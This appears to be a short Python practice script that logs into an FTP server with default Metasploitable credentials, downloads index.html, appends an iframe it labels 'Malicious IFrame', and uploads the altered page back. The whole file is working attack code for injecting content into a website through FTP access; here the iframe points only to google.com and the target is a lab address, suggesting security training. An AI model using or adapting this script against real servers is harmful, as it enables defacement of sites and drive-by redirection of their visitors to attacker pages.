#!/usr/bin/python3
import ftplib

def injectPage(ftp,page,redirect):
    try:
        f = open(page,'w')
        ftp.retrlines('RETR {}'.format(page),f.write)
        print("Downloaded Complete: {}".format(page))
        f.write(redirect)
        f.close()
        print("Inserted Malicious IFrame in {}".format(page))
        ftp.storlines("STOR {}".format(page),open(page,"rb+"))
        print("Uplooaded Successfully {}".format(page))
        ftp.quit()
    except Exception as e:
        print("Error Occured: {}".format(e))

if __name__ == "__main__":
    host = "192.168.0.106"
    username = "msfadmin"
    password = "msfadmin"
    ftp = ftplib.FTP(host=host)
    ftp.login(username,password)
    redirect = "<iframe src=http://google.com/></iframe>"
    injectPage(ftp,'index.html',redirect)